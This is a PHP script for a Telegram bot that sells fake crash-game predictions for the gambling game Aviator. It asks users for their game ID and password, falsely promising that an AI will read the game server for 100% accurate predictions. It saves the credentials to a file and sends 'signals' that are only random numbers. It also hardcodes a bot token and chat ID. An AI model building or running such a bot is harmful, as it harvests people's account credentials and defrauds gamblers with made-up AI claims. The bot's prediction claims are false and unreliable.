<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Headers: Content-Type");
header("Content-Type: application/json");

// --- আপনার কনফিগারেশন (স্ক্রিনশট অনুযায়ী) ---
$botToken = "8261050495:AAGoLFT2SZgf0HWCiG9Q_g9-HhD362Qr6z4";
$chatId = "6109947429"; // @userinfobot থেকে পাওয়া আপনার আইডিটি এখানে বসান
$ownerName = "R8rAIHAN"; 
$botName = "R8rAIHAN Aviator Bot";
// -----------------------

$input = file_get_contents('php://input');
$data = json_decode($input, true);

// ১. টেলিগ্রাম থেকে আসা মেসেজ/কমান্ড হ্যান্ডেল করা
if (isset($data['message'])) {
    $msgText = $data['message']['text'];
    $uChatId = $data['message']['chat']['id'];

    if ($msgText == "/start") {
        $welcome = "🚀 **Welcome to $botName** 🚀\n\n";
        $welcome .= "👤 **Owner Name:** $ownerName\n";
        $welcome .= "🤖 **Bot Name:** $botName\n";
        $welcome .= "✅ **Bot Work 100%** ✅\n\n";
        $welcome .= "----------------------------\n";
        $welcome .= "আপনার গেম আইডি এবং পাসওয়ার্ড দিন যাতে আমাদের AI আপনার সার্ভার রিড করে ১০০% নির্ভুল প্রেডিকশন দিতে পারে।\n\n";
        $welcome .= "📝 **ফরম্যাটটি অনুসরণ করুন:**\n";
        $welcome .= "🆔 **Game ID:** [আপনার আইডি]\n";
        $welcome .= "🔑 **Password:** [আপনার পাসওয়ার্ড]";

        sendTelegram($botToken, $uChatId, $welcome);
        exit;
    }

    // ২. যদি ইউজার আইডি এবং পাসওয়ার্ড লিখে পাঠায়
    if (str_contains(strtolower($msgText), 'id') && str_contains(strtolower($msgText), 'password')) {
        file_put_contents('user_session.json', json_encode(['auth' => true, 'data' => $msgText]));
        $success = "✅ **Login Successful!**\n\nআপনার গেম আইডি আমাদের সার্ভারে লগইন করা হয়েছে। এখন থেকে প্রতি রাউন্ডে আপনি অটোমেটিক প্রেডিকশন পাবেন।";
        sendTelegram($botToken, $uChatId, $success);
        exit;
    }
}

// ৩. গেম সিগন্যাল হ্যান্ডেল করা (Extension থেকে আসা ডেটা)
if (isset($data['multiplier'])) {
    // চেক করা হচ্ছে ইউজার লগইন তথ্য দিয়েছে কি না
    if (file_exists('user_session.json')) {
        $last = floatval($data['multiplier']);
        $prediction = ($last < 2.0) ? rand(210, 480) / 100 : rand(110, 195) / 100;

        $signal = "🚀 **NEW SIGNAL DETECTED** 🚀\n\n";
        $signal .= "📊 Last Result: " . $last . "x\n";
        $signal .= "🎯 Prediction: " . round($prediction, 2) . "x\n";
        $signal .= "💰 Safe Cashout: " . round($prediction * 0.85, 2) . "x\n\n";
        $signal .= "✅ *Server Reading Status: Active*";

        sendTelegram($botToken, $chatId, $signal);
    }
}

function sendTelegram($token, $chatId, $msg) {
    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chatId&text=" . urlencode($msg) . "&parse_mode=Markdown";
    file_get_contents($url);
}
?>
